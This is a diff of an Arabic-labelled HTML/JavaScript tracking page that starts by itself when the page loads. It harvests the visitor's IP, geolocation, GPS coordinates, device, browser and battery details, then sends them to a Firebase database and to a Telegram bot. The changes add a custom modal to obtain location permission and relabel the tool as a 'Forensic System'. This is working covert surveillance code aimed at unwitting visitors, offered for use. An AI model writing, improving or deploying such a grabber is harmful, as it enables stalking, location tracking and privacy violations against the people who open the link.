                         log(`✓ IP: ${ip}`, 'success');
-                        return ip;
+                        updateProgress(20, 'تم تحديد الشبكة');
+                        break;
                     }
                 } catch(e) {
                     log(`✗ فشل ${api}`, 'warn');
                 }
             }
-            data.ip = 'Unknown';
-            updateElement('ip', 'Unknown');
-            return null;
-        }
 
-        // 📍 Get Location from IP
-        async function getIPLocation(ip) {
-            log('📍 جاري جلب الموقع...', 'info');
-            updateProgress(20, 'جلب معلومات الموقع');
-            try {
-                const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                const loc = await res.json();
-                data.country = loc.country_name || 'Unknown';
-                data.city = loc.city || 'Unknown';
-                data.isp = loc.org || loc.asn || 'Unknown';
-                data.latIP = loc.latitude;
-                data.lngIP = loc.longitude;
-                updateElement('country', data.country);
-                updateElement('city', data.city);                updateElement('isp', data.isp);
-                log(`✓ الموقع: ${data.city}, ${data.country}`, 'success');
-                updateProgress(30, 'تم تحديد الموقع');
-                return true;
-            } catch(e) {
-                log('✗ فشل جلب الموقع', 'error');
-                return false;
-            }
-        }
-
-        // 🛰️ GPS
-        function getGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    log('✗ GPS غير مدعوم', 'error');
-                    updateElement('lat', 'Not Supported');
-                    updateElement('lng', 'Not Supported');
-                    resolve(false);
-                    return;
+            // Get location from IP
+            if (data.ip && data.ip !== 'Unknown') {
+                log('📍 جاري تحديد الموقع الجغرافي...', 'info');
+                updateProgress(30, 'تحليل الموقع');
+                try {
+                    const res = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    const loc = await res.json();
+                    data.country = loc.country_name || 'Unknown';
+                    data.city = loc.city || 'Unknown';
+                    data.isp = loc.org || loc.asn || 'Unknown';
+                    data.latIP = loc.latitude;
+                    data.lngIP = loc.longitude;
+                    
+                    updateElement('country', data.country);
+                    updateElement('city', data.city);
+                    updateElement('isp', data.isp);
+                    
+                    log(`✓ الموقع: ${data.city}, ${data.country}`, 'success');
+                    updateProgress(40, 'تم تحديد الموقع');
+                } catch(e) {
+                    log('✗ فشل جلب الموقع', 'error');
                 }
-                log('🛰️ جاري طلب GPS...', 'info');
-                updateProgress(40, 'طلب إذن الموقع');
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.lat = pos.coords.latitude.toFixed(6);
-                        data.lng = pos.coords.longitude.toFixed(6);
-                        data.accuracy = pos.coords.accuracy.toFixed(2);
-                        updateElement('lat', data.lat);
-                        updateElement('lng', data.lng);
-                        log(`✓ GPS: ${data.lat}, ${data.lng}`, 'success');
-                        showMap(parseFloat(data.lat), parseFloat(data.lng));
-                        updateProgress(50, 'تم تحديد الموقع');
-                        resolve(true);
-                    },
-                    err => {
-                        log(`✗ GPS: ${err.message}`, 'error');
-                        updateElement('lat', 'Denied');
-                        updateElement('lng', 'Denied');
-                        if (data.latIP && data.lngIP) {
-                            log('📍 استخدام موقع IP', 'warn');
-                            showMap(data.latIP, data.lngIP);
-                        }
-                        updateProgress(50, 'GPS مرفوض');
-                        resolve(false);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            });
-        }
-        // Show Map
-        function showMap(lat, lng) {
-            const mapEl = document.getElementById('map');
-            mapEl.classList.add('active');
-            if (!map) {
-                map = L.map('map').setView([lat, lng], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
-                L.marker([lat, lng]).addTo(map).bindPopup('📍 الموقع').openPopup();
-                log('✓ الخريطة مفتوحة', 'success');
-            } else {
-                map.setView([lat, lng], 15);
             }
+            // Show custom location modal for GPS
+            showLocationModal();
         }
 
-        // 📊 Collect Device Info
+        // Get Device Information
         function getDeviceInfo() {
-            log('📱 جمع بيانات الجهاز...', 'info');
-            updateProgress(60, 'تحليل الجهاز');
+            log('📱 جاري تحليل الجهاز...', 'info');
+            updateProgress(65, 'تحليل الجهاز');
             const ua = navigator.userAgent;
             
+            // OS Detection
             if (ua.includes('Android')) {
                 const match = ua.match(/Android (\d+\.\d+)/);
                 data.os = `Android ${match ? match[1] : ''}`;
@@ -515,30 +948,46 @@
                 const match = ua.match(/OS (\d+)_/);
                 data.os = `iOS ${match ? match[1] + '.x' : ''}`;
             } else if (ua.includes('Windows')) {
-                data.os = 'Windows';
+                data.os = ua.includes('Windows NT 10') ? 'Windows 10/11' : 'Windows';
             } else if (ua.includes('Mac')) {
                 data.os = 'macOS';
+            } else if (ua.includes('Linux')) {
+                data.os = 'Linux';
             } else {
                 data.os = navigator.platform || 'Unknown';
             }
             
-            if (ua.includes('Chrome') && !ua.includes('Edg')) data.browser = 'Chrome';
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) data.browser = 'Safari';
-            else if (ua.includes('Firefox')) data.browser = 'Firefox';
-            else if (ua.includes('Edg')) data.browser = 'Edge';
-            else data.browser = 'Unknown';
+            // Browser Detection
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                const match = ua.match(/Chrome\/(\d+\.\d+)/);
+                data.browser = `Chrome ${match ? match[1] : ''}`;
+            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+                data.browser = 'Safari';
+            } else if (ua.includes('Firefox')) {
+                const match = ua.match(/Firefox\/(\d+\.\d+)/);
+                data.browser = `Firefox ${match ? match[1] : ''}`;
+            } else if (ua.includes('Edg')) {
+                data.browser = 'Microsoft Edge';
+            } else {
+                data.browser = 'Unknown';
+            }
             
-            data.screen = `${screen.width}x${screen.height}`;
+            data.screen = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight})`;
+            data.colorDepth = `${screen.colorDepth}-bit`;
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             data.language = navigator.language || 'Unknown';
             data.url = window.location.href;
             data.timestamp = new Date().toISOString();
-            data.userAgent = ua;
+            data.platform = navigator.platform;            data.cookieEnabled = navigator.cookieEnabled;
+            data.doNotTrack = navigator.doNotTrack || 'Unknown';
+            data.onLine = navigator.onLine;
             data.memory = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : 'Unknown';
             data.cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
             
-            const conn = navigator.connection;            if (conn) {
+            const conn = navigator.connection;
+            if (conn) {
                 data.connectionType = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'}Mbps)`;
+                data.rtt = `${conn.rtt || '?'}ms`;
             }
             
             updateElement('os', data.os);
@@ -547,16 +996,15 @@
             updateElement('url', data.url);
             updateElement('memory', data.memory);
             updateElement('connectionType', data.connectionType);
+            
             log('✓ بيانات الجهاز مكتملة', 'success');
-            updateProgress(70, 'تم جمع البيانات');
         }
 
-        // 🔋 Battery
+        // Get Battery Status
         async function getBatteryInfo() {
-            log('🔋 فحص البطارية...', 'info');
+            log('🔋 جاري فحص حالة الطاقة...', 'info');
             if (!navigator.getBattery) {
                 updateElement('batteryLevel', 'N/A');
-                updateElement('chargingStatus', 'N/A');
                 return;
             }
             try {
@@ -571,44 +1019,51 @@
                 updateBattery();
                 battery.addEventListener('levelchange', updateBattery);
                 battery.addEventListener('chargingchange', updateBattery);
-                updateProgress(80, 'تم فحص البطارية');
             } catch (e) {
                 log('✗ فشل فحص البطارية', 'error');
             }
         }
 
-        // 💾 Save to Firebase
+        // Save to Firebase
         async function saveToFirebase() {
-            if (!db || !firebaseConnected) {
-                log('⚠️ Firebase غير متصل', 'warn');
-                return false;
+            if (!firebaseConnected) {
+                log('⚠️ Firebase غير متصل', 'warn');                return;
             }
             try {
-                const ref = db.ref('tracking/' + Date.now());
+                const ref = firebase.database().ref('tracking/' + Date.now());
                 await ref.set(data);
-                log('✓ تم الحفظ في Firebase', 'success');                return true;
+                log('✓ تم الحفظ في السحابة', 'success');
             } catch (e) {
                 log('✗ فشل الحفظ', 'error');
-                return false;
             }
         }
 
-        // 📨 Send to Telegram
+        // Send to Telegram
         async function sendToTelegram() {
-            log('📨 جاري الإرسال لتليجرام...', 'info');
+            log('📨 جاري إرسال التقرير المشفر...', 'info');
             try {
-                let msg = `🚨 *تقرير تتبع*\n\n`;
+                let msg = `🚨 *FORENSIC REPORT v6.0*\n\n`;
                 msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `🌐 *IP:* \`${data.ip}\`\n`;
+                msg += `🌐 *IP:* \`${data.ip || 'N/A'}\`\n`;
                 msg += `📍 *الموقع:* ${data.city || 'Unknown'}, ${data.country || 'Unknown'}\n`;
-                msg += `🏢 *ISP:* ${data.isp || 'Unknown'}\n\n`;
+                msg += `🏢 *ISP:* ${data.isp || 'Unknown'}\n`;
+                msg += `📡 *الاتصال:* ${data.connectionType || 'Unknown'}\n\n`;
+                
                 if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
-                    msg += `🎯 *GPS:*\nLAT: \`${data.lat}\`\nLNG: \`${data.lng}\`\n`;
-                    msg += `الدقة: ${data.accuracy}م\n\n`;
+                    msg += `🎯 *GPS دقيق:*\n`;
+                    msg += `LAT: \`${data.lat}\`\n`;
+                    msg += `LNG: \`${data.lng}\`\n`;
+                    msg += `الدقة: ${data.accuracy || 'N/A'}م\n\n`;
                 }
+                
                 msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `💻 *الجهاز:*\nOS: ${data.os}\nBrowser: ${data.browser}\n`;
-                msg += `Screen: ${data.screen}\nBattery: ${data.batteryLevel || 'N/A'}\n\n`;
+                msg += `💻 *الجهاز:*\n`;
+                msg += `OS: ${data.os}\n`;
+                msg += `Browser: ${data.browser}\n`;
+                msg += `Screen: ${data.screen}\n`;
+                msg += `Battery: ${data.batteryLevel || 'N/A'}\n`;
+                msg += `Memory: ${data.memory}\n\n`;
+                
                 msg += `━━━━━━━━━━━━━━━━━━━━\n`;
                 msg += `🕒 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n`;
                 msg += `🔗 *الرابط:* ${data.url}`;
@@ -616,208 +1071,74 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
                 });
-
                 if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, latitude: parseFloat(data.lat), longitude: parseFloat(data.lng) })
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: parseFloat(data.lat),
+                            longitude: parseFloat(data.lng)
+                        })
                     });
-                    log('✓ تم إرسال الموقع', 'success');
+                    log('✓ تم إرسال الموقع كـ Location', 'success');
                 }
-                log('✓ تم الإرسال لتليجرام!', 'success');
+
+                log('✓ تم إرسال التقرير بنجاح', 'success');
             } catch (e) {
                 log('✗ فشل الإرسال', 'error');
             }
         }
 
-        // 🚀 MAIN COLLECT FUNCTION (من الكود الأول - يعمل 100%)
-        async function collectData() {
-            log('=== بدء جمع البيانات ===', 'warn');            document.getElementById('dataGrid').innerHTML = '';
-            
-            data = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                os: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                online: navigator.onLine
-            };
-
-            if (isTelegramWebView()) {
-                document.getElementById('telegramWarning').style.display = 'block';
-                log('⚠️ Telegram WebView - ميزات محدودة!', 'error');
-            }
-
-            initFirebase();
-            
-            log('جاري جلب IP...', 'info');
-            const ip = await getIP();
-            if (ip) {
-                data.ip = ip;
-                const loc = await getIPLocation(ip);
-                if (loc) {
-                    data.country = loc.country;
-                    data.city = loc.city;
-                    data.isp = loc.isp;
-                    data.latIP = loc.lat;
-                    data.lngIP = loc.lng;
-                }
-            }
-
-            log('جاري طلب GPS...', 'info');
-            await getGPS();
-            
-            getDeviceInfo();
-            await getBatteryInfo();
-            
-            await saveToFirebase();
-            await sendToTelegram();
-            
-            document.getElementById('successMsg').style.display = 'block';
-            document.getElementById('btnSend').style.display = 'block';
-            log('=== اكتمل ===', 'success');
-            updateStatus('✅ اكتمل - تم الإرسال', 'success');
-            updateProgress(100, 'اكتمل');
-        }
-
-        // Initialize Firebase        function initFirebase() {
-            try {
-                firebase.initializeApp(firebaseConfig);
-                db = firebase.database();
-                const connectedRef = db.ref('.info/connected');
-                connectedRef.on('value', snap => {
-                    firebaseConnected = snap.val() === true;
-                    if (firebaseConnected) {
-                        log('✓ Firebase متصل', 'success');
-                        document.getElementById('connectionStatus').innerText = 'متصل';
-                        document.getElementById('connectionStatus').style.color = '#0f0';
-                    } else {
-                        log('✗ Firebase غير متصل', 'error');
-                        document.getElementById('connectionStatus').innerText = 'غير متصل';
-                        document.getElementById('connectionStatus').style.color = '#f00';
-                    }
-                });
-                return true;
-            } catch (e) {
-                log('✗ فشل Firebase', 'error');
-                return false;
-            }
-        }
-
-        // Image Handlers
-        function handleImageSelect(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            if (!file.type.startsWith('image/')) {
-                log('✗ الملف ليس صورة', 'error');
-                return;
-            }
-            selectedImage = file;
-            const preview = document.getElementById('imagePreview');
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                preview.src = e.target.result;
-                preview.style.display = 'block';
-                document.getElementById('analyzeBtn').disabled = false;
-                log(`✓ تم اختيار: ${file.name}`, 'success');
-            };
-            reader.readAsDataURL(file);
-        }
-
-        function analyzeImage() {
-            if (!selectedImage) return;
-            log('🔍 جاري تحليل الصورة...', 'info');
-            updateProgress(50, 'تحليل الصورة');
-            
-            const reader = new FileReader();            reader.onload = function(e) {
-                try {
-                    const img = new Image();
-                    img.onload = function() {
-                        imageExifData = {
-                            'اسم الملف': selectedImage.name,
-                            'النوع': selectedImage.type,
-                            'الحجم': formatFileSize(selectedImage.size),
-                            'العرض': img.width + ' بكسل',
-                            'الارتفاع': img.height + ' بكسل',
-                            'التاريخ': new Date().toLocaleString('ar-SA')
-                        };
-
-                        EXIF.getData(img, function() {
-                            const exif = EXIF.getAllTags(this);
-                            if (exif.GPSLatitude && exif.GPSLongitude) {
-                                const gps = extractGPSData(exif);
-                                imageExifData['📍 GPS Latitude'] = gps.lat.toFixed(6);
-                                imageExifData['📍 GPS Longitude'] = gps.lng.toFixed(6);
-                                document.getElementById('gpsWarning').style.display = 'block';
-                                showMap(gps.lat, gps.lng);
-                                log(`✓ GPS من الصورة: ${gps.lat}, ${gps.lng}`, 'success');
-                            }
-                            if (exif.DateTimeOriginal) imageExifData['📅 تاريخ التصوير'] = exif.DateTimeOriginal;
-                            if (exif.Make) imageExifData['📷 الشركة'] = exif.Make;
-                            if (exif.Model) imageExifData['📱 الموديل'] = exif.Model;
-                            
-                            displayMetadata();
-                            updateProgress(100, 'اكتمل التحليل');
-                            log('✓ اكتمل', 'success');
-                        });
-                    };
-                    img.src = e.target.result;
-                } catch (error) {
-                    log('✗ فشل التحليل', 'error');
-                }
-            };
-            reader.readAsArrayBuffer(selectedImage);
-        }
-
-        function extractGPSData(exif) {
-            const convertDMSToDD = (degrees, minutes, seconds, direction) => {
-                let dd = degrees + minutes/60 + seconds/3600;
-                if (direction === "S" || direction === "W") dd = dd * -1;
-                return dd;
-            };
-            const lat = exif.GPSLatitude;
-            const lng = exif.GPSLongitude;
-            return {
-                lat: convertDMSToDD(lat[0], lat[1], lat[2], exif.GPSLatitudeRef || 'N'),                lng: convertDMSToDD(lng[0], lng[1], lng[2], exif.GPSLongitudeRef || 'E')
-            };
-        }
-
-        function formatFileSize(bytes) {
-            if (bytes < 1024) return bytes + ' بايت';
-            else if (bytes < 1048576) return (bytes/1024).toFixed(2) + ' كيلوبايت';
-            else return (bytes/1048576).toFixed(2) + ' ميجابايت';
-        }
-
-        function displayMetadata() {
-            const grid = document.getElementById('metadataGrid');
-            grid.innerHTML = '';
-            for (const [key, value] of Object.entries(imageExifData)) {
-                const item = document.createElement('div');
-                item.className = 'metadata-item';
-                item.innerHTML = `<div class="metadata-label">${key}</div><div class="metadata-value">${value}</div>`;
-                grid.appendChild(item);
-            }
-            document.getElementById('imageMetadata').style.display = 'block';
-        }
-
+        // Manual Send Button
         async function sendData() {
             await sendToTelegram();
-            alert('✅ تم الإرسال!');
+            alert('✅ تم إرسال التقرير بنجاح!');
         }
 
-        // AUTO-START (مثل الكود الأول)
+        // Initialize Firebase
+        let firebaseConnected = false;
+        function initFirebase() {
+            try {
+                firebase.initializeApp(firebaseConfig);
+                const db = firebase.database();
+                db.ref('.info/connected').on('value', snap => {
+                    firebaseConnected = snap.val() === true;
+                    document.getElementById('connectionStatus').innerText = firebaseConnected ? 'متصل' : 'غير متصل';
+                    document.getElementById('connectionStatus').style.color = firebaseConnected ? '#0f0' : '#f00';
+                    if (firebaseConnected) log('✓ اتصال آمن بالسحابة', 'success');
+                });
+            } catch(e) {
+                log('✗ فشل الاتصال بالسحابة', 'error');
+            }
+        }
+
+        // AUTO-START on page load
         window.onload = function() {
             initMatrix();
-            log('System initialized. Auto-starting...', 'system');
-            updateStatus('بدء الجمع التلقائي...', 'warning');
+            initFirebase();
+            init2DMap();
+            log('✅ Forensic System v6.0 - جاهز للتحليل', 'system');
+            updateStatus('النظام نشط - جاري التحليل...', 'warning');            
+            // Start auto-collection after 1.5 seconds
             setTimeout(() => {
                 collectData();
-            }, 1000);
+            }, 1500);
         };
+
+        // Handle page visibility
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                log('🔄 المستخدم عاد للصفحة', 'info');
+                updateTime();
+            }
+        });
     </script>
 </body>
 </html>
